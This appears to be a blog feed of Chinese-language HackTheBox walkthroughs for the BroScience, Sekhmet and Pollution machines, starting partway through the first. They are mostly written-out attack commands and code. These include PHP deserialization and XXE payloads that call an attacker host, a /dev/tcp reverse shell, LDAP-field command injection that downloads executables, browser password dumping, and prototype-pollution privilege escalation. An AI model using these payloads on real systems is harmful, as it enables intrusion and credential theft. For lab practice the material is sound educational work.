(RSA)| 256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)|_ 256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)80/tcp open http Apache httpd 2.4.54|_http-title: Did not follow redirect to https://broscience.htb/|_http-server-header: Apache/2.4.54 (Debian)443/tcp open ssl/http Apache httpd 2.4.54 ((Debian))| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT| Not valid before: 2022-07-14T19:48:36|_Not valid after: 2023-07-14T19:48:36|_http-server-header: Apache/2.4.54 (Debian)|_http-title: BroScience : Home| tls-alpn:|_ http/1.1Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 73.45 seconds 80/443需要加hosts： 110.10.11.195 broscience.htb 健身相关的： 目录扫描扫描发现includes，进一步发现img.php: 123456789101112131415161718192021gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u https://broscience.htb/ -k -x php,html,txt/activate.php (Status: 200) [Size: 1256]/comment.php (Status: 302) [Size: 13] [--&gt; /login.php]/images (Status: 301) [Size: 319] [--&gt; https://broscience.htb/images/]/includes (Status: 301) [Size: 321] [--&gt; https://broscience.htb/includes/]/index.php (Status: 200) [Size: 9308]/javascript (Status: 301) [Size: 323] [--&gt; https://broscience.htb/javascript/]/login.php (Status: 200) [Size: 1936]/logout.php (Status: 302) [Size: 0] [--&gt; /index.php]/manual (Status: 301) [Size: 319] [--&gt; https://broscience.htb/manual/]/register.php (Status: 200) [Size: 2161]/styles (Status: 301) [Size: 319] [--&gt; https://broscience.htb/styles/]/user.php (Status: 200) [Size: 1309]gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u https://broscience.htb/includes/ -k -x php,html,txt/db_connect.php (Status: 200) [Size: 0]/header.php (Status: 200) [Size: 369]/img.php (Status: 200) [Size: 39]/utils.php (Status: 200) [Size: 0] img.php直接访问提示缺少path参数： LFI根据path参数，很容易想到LFI，但存在检测： 简单地绕过，两次URL编码即可： 后面就是LFI读文件： 12345678$db_host = \"localhost\";$db_port = \"5432\";$db_name = \"broscience\";$db_user = \"dbuser\";$db_pass = \"RangeOfMotion%777\";$db_salt = \"NaCl\";$activation_link = \"https://broscience.htb/activate.php?code=&#123;$activation_code&#125;\"; db_connect.php register.php代码显示发送激活链接功能还没做： utils.php根据代码，生成激活码的随机数种子和时间相关： 伪随机数所以我们可以自己根据时间生成激活码，一般前后500ms范围内时间作为种子即可 首先注册一个账号，得到服务端的响应时间： 然后根据时间作为随机数种子爆破出有效激活码： 12345php activate.php &gt; codes.txtffuf -w ./codes.txt:FUZZ -u \"https://broscience.htb/activate.php?code=FUZZ\" -fs 125qdJkKQPQa5JeVIzP9JM1PFe3vRGFa3cO [Status: 200, Size: 1251, Words: 292, Lines: 28, Duration: 689ms] 现在，我们注册的账号已经激活，可以登录： activate.php12345678910111213141516&lt;?phpfunction generate_activation_code($time) &#123; $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"; srand($time); $activation_code = \"\"; for ($i = 0; $i &lt; 32; $i++) &#123; $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)]; &#125; return $activation_code;&#125;// find this from the above server response time$ref_time = date(\"U\",strtotime('Mon, 09 Jan 2023 07:08:32 GMT'));for ($t = $ref_time - 500; $t &lt;= $ref_time + 500; $t++) echo generate_activation_code($t).\"\\n\";?&gt; PHP 反序列化查看cookie发现是序列化数据，根据前面utils中的代码存在反序列化操作： 反序列化 getshell根据代码，get_theme读取 cookie 并反序列化它，Avatar读取文件并保存到本地。因此，我们可以利用这些让目标从我们这里读取 shell 脚本，然后触发目标上的 shell。 1php exploit.php reverse shell exploit.php123456789101112131415161718192021222324252627&lt;?phpclass Avatar &#123; public $imgPath; public function __construct($imgPath) &#123; $this-&gt;imgPath = $imgPath; &#125; public function save($tmp) &#123; $f = fopen($this-&gt;imgPath, \"w\"); fwrite($f, file_get_contents($tmp)); fclose($f); &#125;&#125;class AvatarInterface &#123; public $tmp = \"http://10.10.14.19:7777/shell.php\"; public $imgPath = \"./shell.php\"; public function __wakeup() &#123; $a = new Avatar($this-&gt;imgPath); $a-&gt;save($this-&gt;tmp); &#125;&#125;echo base64_encode(serialize(new AvatarInterface));?&gt; 信息前面已经得到有数据库密码，查看数据库得到hash： 12345678910111213psql -U dbuser -h localhost -W -d brosciencePassword: RangeOfMotion%777broscience=&gt; \\dt;select * from users; username | password---------------+---------------------------------- administrator | 15657792073e8a843d4f91fc403454e1 bill | 13edad4932da9dbb57d9cd15b66ed104 michael | bd3dad50e2d578ecba87d5fa15ca5f85 john | a7eed23a7be6fe0d765197b1027453fe dmytro | 5d15340bded5b9395d5d14b9c21bc82b hash crack密码有salt，salt和加密方式在前面也已经得到了，所以修改格式破解hash： 123456789101112└─$ cat hash.txt15657792073e8a843d4f91fc403454e1$NaCl13edad4932da9dbb57d9cd15b66ed104$NaClbd3dad50e2d578ecba87d5fa15ca5f85$NaCla7eed23a7be6fe0d765197b1027453fe$NaCl5d15340bded5b9395d5d14b9c21bc82b$NaClsudo john --wordlist=/usr/share/wordlists/rockyou.txt -form=dynamic='md5($s.$p)' hash.txt13edad4932da9dbb57d9cd15b66ed104 : iluvhorsesandgym (?)5d15340bded5b9395d5d14b9c21bc82b : Aaronthehottest (?)bd3dad50e2d578ecba87d5fa15ca5f85 : 2applesplus2apples (?) user flagbill用户ssh登录，得到user flag： 1bill ： iluvhorsesandgym 提权信息运行pspy64，发现一个/opt/renew_cert.sh定期以root权限运行： 1timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 查看代码，是用来检查证书到期的，很多字段可以进行命令注入，因为证书本身会有字符限制，所以最好的利用点是commonName /opt/renew_cert.sh123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/bin/bashif [ \"$#\" -ne 1 ] || [ $1 == \"-h\" ] || [ $1 == \"--help\" ] || [ $1 == \"help\" ]; then echo \"Usage: $0 certificate.crt\"; exit 0;fiif [ -f $1 ]; then openssl x509 -in $1 -noout -checkend 86400 &gt; /dev/null if [ $? -eq 0 ]; then echo \"No need to renew yet.\"; exit 1; fi subject=$(openssl x509 -in $1 -noout -subject | cut -d \"=\" -f2-) country=$(echo $subject | grep -Eo 'C = .&#123;2&#125;') state=$(echo $subject | grep -Eo 'ST = .*,') locality=$(echo $subject | grep -Eo 'L = .*,') organization=$(echo $subject | grep -Eo 'O = .*,') organizationUnit=$(echo $subject | grep -Eo 'OU = .*,') commonName=$(echo $subject | grep -Eo 'CN = .*,?') emailAddress=$(openssl x509 -in $1 -noout -email) country=$&#123;country:4&#125; state=$(echo $&#123;state:5&#125; | awk -F, '&#123;print $1&#125;') locality=$(echo $&#123;locality:3&#125; | awk -F, '&#123;print $1&#125;') organization=$(echo $&#123;organization:4&#125; | awk -F, '&#123;print $1&#125;') organizationUnit=$(echo $&#123;organizationUnit:5&#125; | awk -F, '&#123;print $1&#125;') commonName=$(echo $&#123;commonName:5&#125; | awk -F, '&#123;print $1&#125;') echo $subject; echo \"\"; echo \"Country =&gt; $country\"; echo \"State =&gt; $state\"; echo \"Locality =&gt; $locality\"; echo \"Org Name =&gt; $organization\"; echo \"Org Unit =&gt; $organizationUnit\"; echo \"Common Name =&gt; $commonName\"; echo \"Email =&gt; $emailAddress\"; echo -e \"\\nGenerating certificate...\"; openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;\"$country $state $locality $organization $organizationUnit $commonName $emailAddress \" 2&gt;/dev/null /bin/bash -c \"mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\"else echo \"File doesn't exist\" exit 1; 提权 &amp; root flag生成一个证书，注入命令，等待触发执行： 12345cd Certs/openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1# Common Name$(chmod +s /usr/bin/bash) shadow12root:$y$j9T$CRyECZOR16PKCYvfMPEU1&#x2F;$&#x2F;&#x2F;xk7MP6mTa0jQvj4rq.H7w8DTBROI3SW9NfWncuoM2:19185:0:99999:7:::bill:$y$j9T$0VHousYX7xxJh3Ih0AzAQ&#x2F;$JO8mxhyALh1nWEVKM9qf675XnEb26Q15SLPakaMchH3:19187:0:99999:7::: 参考资料 HTB - BroScience [Medium] // MeowMeowAttack 的 security.loghttps://meowmeowattack.github.io/htb/broscience/ BroScience - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-BroScience-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sekhmet - HackTheBox","slug":"Sekhmet-HackTheBox","date":"2022-12-28T07:38:36.000Z","updated":"2023-04-03T01:01:24.452Z","comments":true,"path":"2022/12/28/Sekhmet-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/495 10.10.11.179 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.179Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 13:12 CSTNmap scan report for 10.10.11.179Host is up (0.19s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 8c7155df97275ed5375a8de2923bf36e (RSA)| 256 b232f5889bfb58fa35b0710c9abd3cef (ECDSA)|_ 256 eb73c0936e40c8f6b0a828937d18474c (ED25519)80/tcp open http nginx 1.18.0|_http-title: 403 Forbidden|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 116.09 seconds 80需要加hosts： 110.10.11.179 www.windcorp.htb 子域名扫描继续扫描子域名发现portal： 123ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://www.windcorp.htb/\" -H 'Host: FUZZ.windcorp.htb' -fs 153portal [Status: 403, Size: 2436, Words: 234, Lines: 44, Duration: 203ms] portal同样加hosts后访问： portal常规弱口令 admin:admin 登录，根据cookie和响应头可以知道是nodejs： ModSecurity简单测试可以发现存在ModSecurity： shell利用modsecurity ruleset bypass和nodejs rce实现rce： ModSecurity Vulnerability &amp; PoC (CVE-2019-19886)https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/ Exploiting Node.js deserialization bug for Remote Code Execution | OpSecXhttps://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ Node.Js-Security-Course/nodejsshell.py at master · ajinabraham/Node.Js-Security-Coursehttps://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py 123python2 nodejsshell.py 10.10.14.6 4444curl -i --cookie \"app=$cookie_app;profile=$(echo '&#123;\"username\":\"_$$ND_FUNC$$_function()&#123;eval(String.fromCharCode(10,......59,10))&#125;()\"&#125;'|base64 -w0)=&lt;original_cookie&gt;\" 'http://portal.windcorp.htb/' 得到webster用户shell： backup.zipzip文件无法直接破解，但能够查看里面目录结构，知道其中包括/etc/passwd文件，我们可以尝试已知明文攻击： Brute Force - CheatSheet - HackTrickshttps://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack 123456789# create a zip of the passwd filecp /etc/passwd . &amp;&amp; zip passwd.zip passwd# crack and this produces a sequence of codes./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwdd6829d8d 8514ff97 afc3f825# set a new pass to the encrypted file./bkcrack -C backup.zip -U unlocked.zip miao -k d6829d8d 8514ff97 afc3f825 var/lib/sss/db/cache_windcorp.htb.ldb中发现一组账号hash,破解出来密码是pantera： 12345Ray.Duncan@WINDCORP.HTB$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe&#x2F;u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF&#x2F;hAj5ajIsm0zB.wg2zX81pantera ray.duncan &amp; user flag使用域账号ssh登录，ray.duncan可以得到webserver的root权限： 123ssh &#39;ray.duncan@windcorp.htb&#39;@10.10.11.179pantera webserver的root得到user flag： 容器网络扫描进一步探测容器子网,发现192.168.0.2应该是DC： 1234567891011121314151617for p in &#123;1..65535&#125;; do nc -vn 192.168.0.2 $p -w 1 -z &amp; done 2&gt; output.txt(UNKNOWN) [192.168.0.2] 22 (ssh) open(UNKNOWN) [192.168.0.2] 53 (domain) open(UNKNOWN) [192.168.0.2] 80 (http) open(UNKNOWN) [192.168.0.2] 88 (kerberos) open(UNKNOWN) [192.168.0.2] 389 (ldap) open(UNKNOWN) [192.168.0.2] 445 (microsoft-ds) open(UNKNOWN) [192.168.0.2] 464 (kpasswd) open(UNKNOWN) [192.168.0.2] 3268 (?) open(UNKNOWN) [192.168.0.2] 3269 (?) open(UNKNOWN) [192.168.0.2] 5985 (?) open(UNKNOWN) [192.168.0.2] 9389 (?) open(UNKNOWN) [192.168.0.2] 49664 (?) open(UNKNOWN) [192.168.0.2] 51648 (?) open(UNKNOWN) [192.168.0.2] 58219 (?) open(UNKNOWN) [192.168.0.2] 64610 (?) open 所以需要设置代理和DC通信： 12345# local./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse# target./chisel_1.7.6_linux_amd64 client --max-retry-count=1 -v 10.10.14.6:9999 R:1080:socks 然后设置好proxychains,即可和DC通信： 1proxychains4 python3 ~/Tools/impacket/examples/getST.py -dc-ip 192.168.0.2 -spn cifs/hope.windcorp.htb 'windcorp.htb/ray.duncan:pantera' SMB上面已经获得了ST，使用ST访问smb： 1234567891011121314151617export KRB5CCNAME=ray.duncan.ccacheproxychains4 python3 ~/Tools/impacket/examples/smbclient.py ray.duncan@hope.windcorp.htb -k -no-pass# sharesADMIN$C$IPC$NETLOGONSYSVOLWC-Share# use WC-Share# cd temp# cat debug-users.txtIvanJennings43235345MiriamMills93827637BenjaminHernandez23232323RayDuncan9342211 LDAP参考这个： MS ADV190023https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737 在受感染的容器上，转储 ldap 数据库以获取更多信息： 1ldapsearch -LLLY GSSAPI -H ldap:&#x2F;&#x2F;windcorp.htb -b &#39;DC&#x3D;windcorp,DC&#x3D;htb&#39; &gt; ldapinfo.txt 命令注入我们可以更改 ray.duncan 的手机号，这个字段容易被cmd注入。以以下形式构造有效负载：mobile: ;&lt;cmd&gt; 12345678# create a mod.ldifdn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htbchangetype: modifyreplace: mobilemobile: ;wget http://10.10.14.6:7777/file -O c:\\wc-share\\file;# then send to modify the ldap recordldapmodify -Y GSSAPI -H ldap://windcorp.htb -D \"CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb\" -f mod.ldif 检查更改并等待一段时间（2 分钟）以观察希望的请求。注意：mobile字段有字符限制（即 64） applocker目标正在运行applocker，我们可以制作一个 ldif 来获取 applocker 策略 1234dn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htbchangetype: modifyreplace: mobilemobile: ;Get-AppLockerPolicy -Effective -Xml &gt; c:\\wc-share\\u 通过阅读政策，我们了解到我们需要寻找一个不在例外列表中的可以写入的文件夹 参考这个： World-writable directories in %windir%https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56 1234567&lt;FilePathRule Id=\"2c47f772-4d79-4493-b64b-613e17f0011c\" Name=\"All files located in the Windows folder\" Description=\"Allows members of the Everyone group to run applications that are located in the Windows folder.\" UserOrGroupSid=\"S-1-1-0\" Action=\"Allow\"&gt; &lt;Conditions&gt; &lt;FilePathCondition Path=\"%WINDIR%\\*\" /&gt; &lt;/Conditions&gt; &lt;Exceptions&gt; ... &lt;/Exceptions&gt; 我们需要的另一件事是绕过amsi,参考： Powershell CLM Bypass Using Runspaceshttps://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/ scriptrunner编译后继续通过ldap出发执行，得到DC上的scriptrunner shell： 1234567891011# upload the bypass codedn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htbchangetype: modifyreplace: mobilemobile: ;wget http:&#x2F;&#x2F;10.10.14.6:7777&#x2F;B.exe -O C:\\windows\\debug\\wia\\B.exe# run itdn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htbchangetype: modifyreplace: mobilemobile: ;Start-Process -FilePath C:\\windows\\debug\\wia\\B.exe 信息运行winpeas，发现启用了ntlmv2，可以使用smbserver进行ntlm泄漏攻击： https://github.com/ropnop/impacket_static_binaries/releases 12# on webserver./smbserver miao . -smb2support 使用以下 ldif 触发 DC 浏览到我们的假 smbserver: 1234dn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htbchangetype: modifyreplace: mobilemobile: ;cd \\\\webserver.windcorp.htb\\miao\\ 等待触发，得到hash破解出来： 123[*] scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:7fac7b077275dce97d19f843ee6abffd:0101000000000000002d44218c1ad901ac6dba83ddbdf08f0000000001001000580044006200480072004d0065007800020010006d00660073004f00440047005900740003001000580044006200480072004d0065007800040010006d00660073004f00440047005900740007000800002d44218c1ad90106000400020000000800300030000000000000000000000000210000848ca8512f99bcb680a900509bb131558d94dbc4f37763d4ef3f770b53d146680a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000!@p%i&amp;J#iNNo1T2 bob.wood上面得到的密码也是bob.wood的密码，使用powershell以他的身份执行命令： 1234$SecPassword &#x3D; ConvertTo-SecureString &#39;!@p%i&amp;J#iNNo1T2&#39; -AsPlainText -Force$Cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;bob.wood&#39;, $SecPassword)$session &#x3D; New-PSSession -Credential $CredInvoke-Command -Session $session -scriptblock &#123; c:\\windows\\debug\\wia\\B.exe &#125; 上传sharphound，再次采集数据，貌似bob.wood是IT的成员，对DC有PSRemote权限。但是，我们需要成为域管理员（例如 bob.woodadm）才能获取管理员通行证。假设 bob.wood 可能使用同一台计算机作为 bob.woodadm 登录以进行管理工作是合乎逻辑的。因此，在浏览器缓存中搜索可能会找到有用的信息。 bob.woodadm凭据保存在 Edge 中，可在此处找到：C:\\users\\bob.wood\\appdata\\local\\microsoft\\edge\\user data\\default\\Login Data 使用此工具解密密码: moonD4rk/HackBrowserData: Decrypt passwords/cookies/history/bookmarks from the browser. 一款可全平台运行的浏览器数据导出解密工具。https://github.com/moonD4rk/HackBrowserData 12345678PS C:\\windows\\debug\\wia&gt; .\\hbd.exe[NOTICE] [browsingdata.go:71,Output] output to file results/microsoft_edge_default_password.csv successPS C:\\windows\\debug\\wia&gt; cat results/microsoft_edge_default_password.csvUserName,Password,LoginURL,CreateDatebob.woodADM@windcorp.com,smeT-Worg-wer-m024,http://webmail.windcorp.com/login.html,2022-07-04T18:46:59.133335+02:00bob.wood@windcorp.htb,SomeSecurePasswordIGuess!09,http://google.com/login.html,2022-07-04T18:14:00.217981+02:00bob.wood@windcorp.htb,SemTro?32756Gff,http://somewhere.com/login.html,2022-07-04T18:12:42.849216+02:00 bob.woodADM现在，以 bob.woodadm 身份登录并捕获根标志: 1234$SecPassword = ConvertTo-SecureString 'smeT-Worg-wer-m024' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('bob.woodADM', $SecPassword)$session = New-PSSession -Credential $CredInvoke-Command -Session $session -scriptblock &#123; c:\\windows\\debug\\wia\\B.exe &#125; 参考资料 ModSecurity Vulnerability &amp; PoC (CVE-2019-19886)https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/ Exploiting Node.js deserialization bug for Remote Code Execution | OpSecXhttps://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ Node.Js-Security-Course/nodejsshell.py at master · ajinabraham/Node.Js-Security-Coursehttps://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py Brute Force - CheatSheet - HackTrickshttps://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack MS ADV190023https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737 World-writable directories in %windir%https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56 Powershell CLM Bypass Using Runspaceshttps://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/ https://github.com/ropnop/impacket_static_binaries/releases moonD4rk/HackBrowserData: Decrypt passwords/cookies/history/bookmarks from the browser. 一款可全平台运行的浏览器数据导出解密工具。https://github.com/moonD4rk/HackBrowserData Sekhmet - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Sekhmet-HTB-Discussion HTB - Sekhmet [Insane] // MeowMeowAttack’s security.loghttps://meowmeowattack.github.io/htb/sekhmet/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Pollution - HackTheBox","slug":"Pollution-HackTheBox","date":"2022-12-26T07:18:25.000Z","updated":"2023-07-03T00:45:24.254Z","comments":true,"path":"2022/12/26/Pollution-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/12/26/Pollution-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/517 10.10.11.192 端口扫描22,80: 12345678910111213141516171819202122$ nmap -sC -sV -Pn 10.10.11.192Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 13:08 CSTNmap scan report for 10.10.11.192Host is up (0.19s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)| 256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)|_ 256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)80/tcp open http Apache httpd 2.4.54 ((Debian))|_http-title: Home| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.54 (Debian)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 62.48 seconds 80公司官网，底部得到域名： 子域名扫描加hosts后继续枚举子域名，发现forum和developers： 12345610.10.11.192 collect.htbffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://collect.htb/\" -H 'Host: FUZZ.collect.htb' -fs 0,26197forum [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 325ms]developers [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 189ms 两个子域名同样加hosts： forumMyBB forum： developers需要登录： forumforum任意注册登录,memberlist中可以得到用户名列表： 浏览论坛内容，知道Pollution API和k8s,附件中还可以得到一些请求响应信息,包括使用的token: 1token ： ddac62a28254561001277727cb397baf COLLECT ADMIN注意得到的请求是针对主站的，看起来是设置管理员的，所以我们回到主站，注册账号登录，然后使用token把我们设置为admin： admin界面是注册POLLUTION API的账号： POLLUTION API随意测试添加，发现使用XML： XXE 常规XXE： XXE - XEE - XML External Entity - HackTrickshttps://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities 数据格式大概这样，把xxe-payload 放在合法数据中： 1manage_api&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;xxe-payload&gt;&lt;root&gt;&lt;method&gt;POST&lt;&#x2F;method&gt;&lt;uri&gt;&#x2F;auth&#x2F;register&lt;&#x2F;uri&gt;&lt;user&gt;&lt;username&gt;miao1&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;&lt;&#x2F;root&gt; file read1manage_api&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.14.5:7777&#x2F;file.dtd&quot;&gt; %xxe;]&gt;&lt;root&gt;..... 后面就是一点点读文件，../bootstrp.php中得到redis密码： 1COLLECTR3D1SPASS /var/www/developers/.htpasswd中也能得到一个hash，破解出来developer密码： 1developers_group:r0cket file.dtd1234&lt;!ENTITY % file SYSTEM &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&#39;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;10.10.14.5:7777&#x2F;?file&#x3D;%file;&#39;&gt;&quot;&gt;%eval;%exfiltrate; redis使用得到的密码查看redis，发现里面是我们的session id： developer中使用得到的账号密码登录后还有第二层登录，这时redis中多了一条数据，是developer那边的,可以尝试直接修改为已认证数据，绕过登录： 110.10.11.192:6379&gt; set PHPREDIS_SESSION:64eocsg047rtkcf4j9s7ffubfr &quot;username|s:4:\\&quot;miao\\&quot;;role|s:5:\\&quot;admin\\&quot;;auth|s:1:\\&quot;a\\&quot;;&quot; LFI to RCEpage参数LFI，使用php filter进行RCE： synacktiv/php_filter_chain_generatorhttps://github.com/synacktiv/php_filter_chain_generator hxp CTF 2021 - The End Of LFI? - 跳跳糖https://tttang.com/archive/1395/ shell需要尽可能短，所以我们通过下载执行的方式,得到www-data shell： 1234# file mbash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1python3 php_filter_chain_generator.py --chain '&lt;?=`wget -O - 10.10.14.5/m|bash`?&gt;' 信息/var/www/developers/login.php中得到数据库密码： 1$db = new mysqli(\"localhost\", \"webapp_user\", \"Str0ngP4ssw0rdB*12@1\", \"developers\"); 9000端口运行着FastCGI： Fastcgi PHP-FPM Client &amp;&amp; Code Executionhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 FastCGIfastcgi是victor权限： 我们可以把公钥写到victor用户目录，从而ssh连接： 1python3 fpm.py -c '&lt;?php system(\"echo \\\"ssh-rsa ...\\\" &gt; /home/victor/.ssh/authorized_keys\"); exit; ?&gt;' 127.0.0.1 /tmp/miao.php user flagvictor用户目录得到user.txt: 提权信息常规枚举发现root运行的/usr/bin/node /root/pollution_api/index.js 在 victor 的主目录中有一份代码副本：/home/victor/pollution_api 查看代码结合靶机名称，很容易发现原型链污染漏洞,Messages_send.js中调用merge： Prototype Pollution to RCE - HackTrickshttps://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation 因此，对于我们的漏洞利用，我们需要以管理员用户身份对 API 进行身份验证，然后制作恶意污染的负载以获取 RCE。 Messages_send.js12345678910111213141516171819202122232425262728293031const Message = require('../models/Message');const &#123; decodejwt &#125; = require('../functions/jwt');const _ = require('lodash');const &#123; exec &#125; = require('child_process');const messages_send = async(req,res)=&gt;&#123; const token = decodejwt(req.headers['x-access-token']) if(req.body.text)&#123; const message = &#123; user_sent: token.user, title: \"Message for admins\", &#125;; _.merge(message, req.body); exec('/home/victor/pollution_api/log.sh log_message'); Message.create(&#123; text: JSON.stringify(message), user_sent: token.user &#125;); return res.json(&#123;Status: \"Ok\"&#125;); &#125; return res.json(&#123;Status: \"Error\", Message: \"Parameter text not found\"&#125;);&#125;module.exports = &#123; messages_send &#125;; 提权 &amp; root flagAPI访问的用户存储在pullution_apidb中,我们首先把之前注册的用户修改为管理员： 123mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1 -D pollution_api update users set role&#x3D;&#39;admin&#39;; 现在，我们可以登录miao并接收具有admin特权的令牌并利用/admin/messages/sendAPI 1234curl http://127.0.0.1:3000/auth/login -H \"content-type: application/json\" -d '&#123;\"username\":\"miao\",\"password\":\"123456\"&#125;'&#123;\"Status\":\"Ok\",\"Header\":&#123;\"x-access-token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibWlhbyIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MjAzODE2NSwiZXhwIjoxNjcyMDQxNzY1fQ.kpsNQJhRwHHoTZ0Gd60GTnlrW738aNKHlYS7fEzHlas\"&#125;&#125;curl http://127.0.0.1:3000/admin/messages/send -H \"x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibWlhbyIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MjAzODE2NSwiZXhwIjoxNjcyMDQxNzY1fQ.kpsNQJhRwHHoTZ0Gd60GTnlrW738aNKHlYS7fEzHlas\" -H \"content-type: application/json\" -d '&#123;\"text\":&#123;\"constructor\":&#123;\"prototype\":&#123;\"shell\":\"/proc/self/exe\",\"argv0\":\"console.log(require(\\\"child_process\\\").execSync(\\\"chmod +s /usr/bin/bash\\\").toString())//\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"&#125;&#125;&#125;&#125;' 